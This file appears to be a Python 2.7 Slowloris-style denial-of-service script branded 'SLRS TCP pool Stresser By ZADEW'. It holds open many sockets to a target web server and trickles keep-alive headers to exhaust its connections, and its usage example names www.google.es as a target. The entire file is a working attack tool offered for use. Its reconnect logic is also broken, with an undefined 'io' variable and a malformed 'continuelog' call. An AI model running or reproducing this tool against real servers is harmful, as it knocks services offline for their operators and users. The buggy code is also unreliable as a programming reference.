#python 2.7

#Designed for Pythonista3 

# usage: [target] [number of sockets] [payload] [V for verbose/ NV for no verbose]

#example:  www.google.es 100 random V

import socket
import random
import time
import sys

print("{}SLRS TCP pool Stresser By ZADEW!").format(" " * 27)

ip = sys.argv[1]
socket_count = int(sys.argv[2])
payload = sys.argv[3]
verbose = sys.argv[4]

if verbose == 'V' or verbose == 'verbose':
	verbose = True
else:
	verbose = False

if payload == 'random':
	payload = random.randint(0, 2000)
else:
	payload = payload

print("\n[*] Attacking {} with {} sockets".format(ip, socket_count))

log_level = 2

def log(text, level=1):
	if log_level >= level:
		print(text)

socket_list = []

headers = [
	"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"Accept-language: en-US,en,q=0.5"
	]

time.sleep(0.3)
log("[*] Creating sockets")
for _ in range(socket_count):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(4)
		s.connect((ip, 80))
	except socket.error:
		print("\n[!] Socket Creation Failed\n")
		break
	socket_list.append(s)

time.sleep(0.3)
	
log("[*] Setting up the connection")
for s in socket_list:
	s.send("GET /?{} HTTP/1.1\r\n".format(payload).encode("utf-8"))
	for header in headers:
		s.send(bytes("{}\r\n".format(header).encode("utf-8")))


time.sleep(0.3)
print("[*] Injecting Payload...\n")
time.sleep(1)

if verbose == True:
	while True:
		log("[+] Sending keep-alive headers" + " " * 5 + ">> GET /" + ip + " HTTP/1.1")
		for s in socket_list:
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 7145)).encode("utf-8"))
			except socket.error:
				socket_list.remove(s)
				try:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(4)
					s.connect((io, 80))
					for s in socket_list:
						s.send("GET /?{} HTTP/1.1\r\n".format(payload).encode("utf-8"))
						for header in headers:
							s.send(bytes("{}\r\n".format(header).encode("utf-8")))
				except socket.error:
					continuelog("[*] Attacking {} with {} sockets\n".format(ip, socket_count))
		
		time.sleep(9) 
else:
	while True:
		log("[+] Sending keep-alive headers")
		for s in socket_list:
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 7145)).encode("utf-8"))
			except socket.error:
				socket_list.remove(s)
				try:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(4)
					s.connect((io, 80))
					for s in socket_list:
						s.send("GET /?{} HTTP/1.1\r\n".format(payload).encode("utf-8"))
						for header in headers:
							s.send(bytes("{}\r\n".format(header).encode("utf-8")))
				except socket.error:
					continuelog("[*] Attacking {} with {} sockets\n".format(ip, socket_count))
		
		time.sleep(2) # 2 for testing, default is 9
